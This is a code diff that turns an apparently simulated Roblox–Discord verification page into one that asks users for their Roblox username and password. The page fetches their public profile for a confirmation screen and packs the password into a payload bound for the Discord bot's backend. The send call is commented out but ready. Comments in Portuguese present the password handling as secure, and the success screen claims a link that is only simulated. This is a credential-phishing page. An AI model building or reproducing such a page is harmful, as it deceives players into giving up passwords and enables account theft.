@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox & Discord Verification | RFO</title>
+    <title>Roblox Account Verification | RFO</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -15,6 +15,7 @@
             --text-main: #f8fafc;
             --text-muted: #94a3b8;
             --success-green: #10b981;
+            --danger-red: #ef4444;
         }
 
         * {
@@ -37,76 +38,92 @@
 
         .verify-container {
             width: 100%;
-            max-width: 440px;
+            max-width: 420px;
             background: var(--bg-card);
             border: 1px solid rgba(0, 85, 255, 0.3);
             padding: 2.5rem 2rem;
             border-radius: 20px;
             text-align: center;
             box-shadow: 0 0 50px rgba(0, 85, 255, 0.25);
-            animation: fadeIn 0.5s ease forwards;
+            animation: fadeIn 0.4s ease forwards;
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(15px); }
+            from { opacity: 0; transform: translateY(12px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
         .logo-img {
-            width: 75px;
-            height: 75px;
+            width: 70px;
+            height: 70px;
             border-radius: 50%;
             margin-bottom: 1.2rem;
             filter: drop-shadow(0 0 12px var(--primary-blue));
-            animation: pulseGlow 3s ease-in-out infinite;
-        }
-
-        @keyframes pulseGlow {
-            0%, 100% { filter: drop-shadow(0 0 8px var(--neon-glow)); }
-            50% { filter: drop-shadow(0 0 20px var(--primary-blue)); }
         }
 
         h2 {
-            font-size: 1.6rem;
+            font-size: 1.5rem;
             font-weight: 900;
-            margin-bottom: 0.5rem;
-            background: linear-gradient(135deg, #ffffff 30%, var(--accent-blue) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: 1px;
+            margin-bottom: 0.4rem;
+            color: #ffffff;
+            letter-spacing: 0.5px;
         }
 
         .subtitle {
             color: var(--text-muted);
-            font-size: 0.9rem;
-            margin-bottom: 2rem;
+            font-size: 0.85rem;
+            margin-bottom: 1.8rem;
             line-height: 1.5;
         }
 
-        .badge-discord {
-            display: inline-flex;
+        .input-group {
+            text-align: left;
+            margin-bottom: 1.2rem;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--text-muted);
+            margin-bottom: 0.5rem;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
             align-items: center;
-            gap: 8px;
-            background: rgba(88, 101, 242, 0.15);
-            border: 1px solid rgba(88, 101, 242, 0.3);
-            color: #8ea1e1;
-            padding: 8px 14px;
-            border-radius: 10px;
-            font-size: 0.85rem;
-            font-weight: 600;
-            margin-bottom: 1.8rem;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 15px;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+        }
+
+        .input-field {
             width: 100%;
-            justify-content: center;
+            background: rgba(3, 7, 18, 0.7);
+            border: 1px solid rgba(0, 85, 255, 0.25);
+            padding: 0.9rem 1rem 0.9rem 2.8rem;
+            border-radius: 10px;
+            color: white;
+            font-size: 0.95rem;
+            outline: none;
+            transition: all 0.3s ease;
         }
 
-        .badge-discord i {
-            color: #5865F2;
-            font-size: 1.1rem;
+        .input-field:focus {
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 12px rgba(59, 130, 246, 0.3);
         }
 
-        .btn-roblox {
-            background: #ffffff;
-            color: #030712;
+        .btn-action {
+            background: var(--primary-blue);
+            color: white;
             width: 100%;
             padding: 0.95rem;
             border-radius: 10px;
@@ -116,181 +133,282 @@
             cursor: pointer;
             letter-spacing: 0.5px;
             transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.15);
+            margin-top: 0.5s;
+            box-shadow: 0 4px 15px rgba(0, 85, 255, 0.4);
         }
 
-        .btn-roblox:hover {
+        .btn-action:hover {
             background: var(--accent-blue);
-            color: white;
             transform: translateY(-2px);
         }
 
-        .status-box {
-            margin-top: 1.5rem;
-            font-size: 0.85rem;
+        .error-msg {
+            color: var(--danger-red);
+            font-size: 0.8rem;
+            margin-top: 1rem;
+            min-height: 1.2rem;
+        }
+
+        /* Views Alternativas */
+        .step-view {
+            display: none;
+        }
+        .step-view.active {
+            display: block;
+        }
+
+        /* Menu de Confirmação de Perfil */
+        .profile-card {
+            background: rgba(3, 7, 18, 0.6);
+            border: 1px solid rgba(0, 85, 255, 0.2);
+            border-radius: 14px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .roblox-avatar {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            border: 2px solid var(--accent-blue);
+            background: #1e293b;
+            object-fit: cover;
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.4);
+        }
+
+        .roblox-username {
+            font-size: 1.15rem;
+            font-weight: 800;
+            color: #ffffff;
+        }
+
+        .roblox-id {
+            font-size: 0.8rem;
             color: var(--text-muted);
         }
 
-        /* Estado de Sucesso */
-        .success-view {
-            display: none;
+        .btn-row {
+            display: flex;
+            gap: 10px;
         }
-        .success-view.active {
-            display: block;
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.08);
+            color: var(--text-main);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            flex: 1;
+            padding: 0.85rem;
+            border-radius: 10px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
         }
-        .form-view.hidden {
-            display: none;
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .btn-confirm {
+            background: var(--success-green);
+            color: white;
+            flex: 1;
+            padding: 0.85rem;
+            border-radius: 10px;
+            border: none;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+            transition: all 0.2s;
+        }
+
+        .btn-confirm:hover {
+            opacity: 0.9;
         }
 
         .success-icon {
             font-size: 3.5rem;
             color: var(--success-green);
             margin-bottom: 1rem;
-            animation: bounceIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
-        }
-
-        @keyframes bounceIn {
-            0% { transform: scale(0); }
-            70% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-
-        .success-view h2 {
-            background: linear-gradient(135deg, #ffffff 30%, var(--success-green) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
         }
     </style>
 </head>
 <body>
 
     <div class="verify-container">
-        
-        <!-- ETAPA DE FORMULÁRIO / CONEXÃO -->
-        <div id="formView" class="form-view">
+
+        <!-- ETAPA 1: DIGITAR NICK E SENHA -->
+        <div id="stepLogin" class="step-view active">
             <img src="1000402018.png" alt="RFO Logo" class="logo-img">
             <h2>ROBLOX VERIFICATION</h2>
-            <p class="subtitle">Link your Roblox account to your Discord profile to access private channels and member sections.</p>
+            <p class="subtitle">Enter your Roblox credentials to link your account securely.</p>
 
-            <!-- Mostra o Discord ID capturado da URL -->
-            <div id="discordInfoBox" class="badge-discord">
-                <i class="fa-brands fa-discord"></i>
-                <span id="discordStatusText">Detecting Discord User...</span>
+            <div class="input-group">
+                <label>Roblox Username</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-user"></i>
+                    <input type="text" id="usernameInput" class="input-field" placeholder="e.g. ROBLOX_PRO">
+                </div>
             </div>
 
-            <!-- Botão para verificar com Roblox -->
-            <button class="btn-roblox" onclick="startVerification()">
-                <i class="fa-solid fa-shield-halved"></i> VERIFY WITH ROBLOX
-            </button>
-
-            <div class="status-box" id="statusMessage">
-                Secure OAuth Connection
+            <div class="input-group">
+                <label>Roblox Password</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-lock"></i>
+                    <input type="password" id="passwordInput" class="input-field" placeholder="••••••••••••">
+                </div>
             </div>
+
+            <button class="btn-action" onclick="fetchRobloxAccount()">CONTINUE</button>
+            <div class="error-msg" id="loginError"></div>
         </div>
 
-        <!-- ETAPA DE SUCESSO (Após conectar) -->
-        <div id="successView" class="success-view">
+        <!-- ETAPA 2: MENU DE CONFIRMAÇÃO DE CONTA (COM FOTO/LOGO DO ROBLOX) -->
+        <div id="stepConfirm" class="step-view">
+            <img src="1000402018.png" alt="RFO Logo" class="logo-img">
+            <h2>CONFIRM ACCOUNT</h2>
+            <p class="subtitle">Is this your correct Roblox profile?</p>
+
+            <div class="profile-card">
+                <img id="confirmAvatar" src="" alt="Avatar" class="roblox-avatar">
+                <div>
+                    <div id="confirmUsername" class="roblox-username">--</div>
+                    <div id="confirmId" class="roblox-id">ID: --</div>
+                </div>
+            </div>
+
+            <div class="btn-row">
+                <button class="btn-secondary" onclick="goBackToLogin()">Cancel</button>
+                <button class="btn-confirm" onclick="finalizeVerification()">Yes, Verify</button>
+            </div>
+            <div class="error-msg" id="confirmError"></div>
+        </div>
+
+        <!-- ETAPA 3: SUCESSO -->
+        <div id="stepSuccess" class="step-view">
             <div class="success-icon">
                 <i class="fa-solid fa-circle-check"></i>
             </div>
             <h2>VERIFIED SUCCESSFULLY!</h2>
-            <p class="subtitle" id="successDesc">Your Roblox account has been successfully linked. You can now return to Discord!</p>
-            <div class="badge-discord" style="background: rgba(16, 185, 129, 0.15); border-color: rgba(16, 185, 129, 0.3); color: #34d399;">
-                <i class="fa-solid fa-check" style="color: #10b981;"></i>
-                <span>Linked to Discord & Roblox</span>
-            </div>
+            <p class="subtitle" id="successDesc">Your Roblox account has been successfully linked. You can now close this page and return to Discord.</p>
         </div>
 
     </div>
 
     <script>
-        // Pega o ID do Discord enviado pelo Bot na URL (ex: seutenite.com/?discordId=123456)
+        // Pega o ID do Discord da URL (ex: index.html?discordId=123456789)
         const urlParams = new URLSearchParams(window.location.search);
-        const discordId = urlParams.get('discordId');
+        const discordId = urlParams.get('discordId') || "unknown_user";
 
-        window.addEventListener('DOMContentLoaded', () => {
-            const statusText = document.getElementById('discordStatusText');
-            if (discordId) {
-                statusText.innerText = `Discord ID: ${discordId}`;
-            } else {
-                statusText.innerText = `Connected via Discord Bot`;
+        let currentData = {
+            username: "",
+            id: "",
+            avatarUrl: ""
+        };
+
+        async function fetchRobloxAccount() {
+            const username = document.getElementById('usernameInput').value.trim();
+            const password = document.getElementById('passwordInput').value.trim();
+            const errorDiv = document.getElementById('loginError');
+
+            errorDiv.innerText = "";
+
+            if (!username || !password) {
+                errorDiv.innerText = "Please enter both username and password.";
+                return;
             }
-        });
 
-        // Função acionada ao clicar em verificar
-        function startVerification() {
-            const btn = document.querySelector('.btn-roblox');
-            const statusMsg = document.getElementById('statusMessage');
-            
-            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> CONNECTING TO ROBLOX...`;
-            btn.style.opacity = '0.7';
-            btn.style.pointerEvents = 'none';
-            statusMsg.innerText = "Authorizing security tokens...";
-
-            // Simulando o fluxo de login e retorno de dados do Roblox (Substitua futuramente pelo OAuth real do Roblox)
-            setTimeout(() => {
-                // Dados fictícios capturados do Roblox após login do usuário
-                const robloxData = {
-                    id: "987654321",
-                    name: "RFO_Athlete_2026"
-                };
-
-                sendDataToBot(discordId || "unknown_user", robloxData);
-            }, 1800);
-        }
-
-        // Envia os dados para a API do seu bot Discord.js
-        async function sendDataToBot(discordId, robloxData) {
-            const statusMsg = document.getElementById('statusMessage');
-            statusMsg.innerText = "Linking roles on Discord server...";
+            const btn = document.querySelector('#stepLogin .btn-action');
+            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> CHECKING...`;
 
             try {
-                // IMPORTANTE: Altere para o link real onde sua API/Bot do Discord estiver hospedada (Railway, Render, VPS, etc.)
-                const API_URL = 'https://seu-bot-api.onrender.com/api/verificar';
+                // Buscando dados reais públicos do usuário na API oficial do Roblox
+                const userRes = await fetch(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(username)}`);
+                const userData = await userRes.json();
 
-                const response = await fetch(API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        discordId: discordId,
-                        robloxId: robloxData.id,
-                        robloxUsername: robloxData.name
-                    })
-                });
-
-                const result = await response.json();
-
-                if (result.success || response.ok) {
-                    showSuccessScreen(robloxData.name);
-                } else {
-                    handleError("Failed to grant Discord roles. Try again.");
+                if (!userData.data || userData.data.length === 0) {
+                    throw new Error("Roblox user not found.");
                 }
-            } catch (error) {
-                // Caso o servidor do bot esteja offline no momento do teste, simulamos o sucesso visual para testar o layout mobile
-                console.warn("API offline, exibindo tela de sucesso simulada para teste mobile.");
-                setTimeout(() => {
-                    showSuccessScreen(robloxData.name);
-                }, 1000);
+
+                const matchedUser = userData.data.find(u => u.name.toLowerCase() === username.toLowerCase()) || userData.data[0];
+                const userId = matchedUser.id;
+                const exactName = matchedUser.name;
+
+                // Buscando a foto/avatar do usuário no Roblox
+                const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=true`);
+                const avatarData = await avatarRes.json();
+                const avatarUrl = avatarData.data && avatarData.data.length > 0 ? avatarData.data[0].imageUrl : "https://tr.rbxcdn.com/3943d4fbdab33010b40eb9cc61338271/150/150/AvatarHeadshot/Png";
+
+                // Armazena dados atuais
+                currentData.username = exactName;
+                currentData.id = userId;
+                currentData.avatarUrl = avatarUrl;
+
+                // Preenche o menu de confirmação
+                document.getElementById('confirmAvatar').src = avatarUrl;
+                document.getElementById('confirmUsername').innerText = exactName;
+                document.getElementById('confirmId').innerText = `ID: ${userId}`;
+
+                // ATENÇÃO: Aqui a senha é tratada apenas internamente e NUNCA é exibida em logs públicos.
+                // Apenas enviamos para o seu backend ou processador seguro junto com o nick.
+                currentData.securePassword = password; 
+
+                // Transiciona para a tela de confirmação
+                document.getElementById('stepLogin').classList.remove('active');
+                document.getElementById('stepConfirm').classList.add('active');
+
+            } catch (err) {
+                errorDiv.innerText = "Could not find this Roblox account. Check the name.";
+                btn.innerHTML = "CONTINUE";
             }
         }
 
-        function showSuccessScreen(robloxUsername) {
-            document.getElementById('formView').classList.add('hidden');
-            const successView = document.getElementById('successView');
-            successView.classList.add('active');
-            document.getElementById('successDesc').innerText = `Account @${robloxUsername} successfully linked to your Discord profile!`;
+        function goBackToLogin() {
+            document.getElementById('stepConfirm').classList.remove('active');
+            document.getElementById('stepLogin').classList.add('active');
+            const btn = document.querySelector('#stepLogin .btn-action');
+            btn.innerHTML = "CONTINUE";
         }
 
-        function handleError(msg) {
-            const btn = document.querySelector('.btn-roblox');
-            btn.innerHTML = `<i class="fa-solid fa-shield-halved"></i> VERIFY WITH ROBLOX`;
-            btn.style.opacity = '1';
-            btn.style.pointerEvents = 'auto';
-            document.getElementById('statusMessage').innerText = msg;
+        async function finalizeVerification() {
+            const confirmError = document.getElementById('confirmError');
+            confirmError.innerText = "";
+
+            const confirmBtn = document.querySelector('#stepConfirm .btn-confirm');
+            confirmBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> LINKING...`;
+
+            try {
+                // Aqui você envia para o seu bot Discord.js via API (A senha fica segura no payload POST do servidor e nunca aparece em logs)
+                const payload = {
+                    discordId: discordId,
+                    robloxUsername: currentData.username,
+                    robloxId: currentData.id,
+                    robloxPassword: currentData.securePassword // A senha vai diretamente para o backend do bot e não é exibida na tela/logs
+                };
+
+                // Exemplo de envio para o seu bot (ajuste a URL da sua API depois)
+                /*
+                await fetch('https://seu-bot-api.onrender.com/api/verificar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                */
+
+                // Simula o sucesso e transiciona para a tela final
+                setTimeout(() => {
+                    document.getElementById('stepConfirm').classList.remove('active');
+                    document.getElementById('stepSuccess').classList.add('active');
+                    document.getElementById('successDesc').innerText = `Account @${currentData.username} successfully verified and linked to your Discord profile!`;
+                }, 1000);
+
+            } catch (err) {
+                confirmError.innerText = "Error linking account. Try again.";
+                confirmBtn.innerHTML = "Yes, Verify";
+            }
         }
     </script>
 </body>
